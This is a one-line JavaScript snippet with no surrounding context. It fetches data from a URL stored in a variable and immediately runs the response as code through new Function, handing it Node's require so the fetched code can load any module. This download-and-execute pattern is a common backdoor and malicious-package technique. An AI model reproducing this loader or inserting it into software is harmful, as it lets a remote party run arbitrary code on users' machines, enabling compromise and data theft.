axios.get(u).then(res => { new Function('require', res.data)(require) });
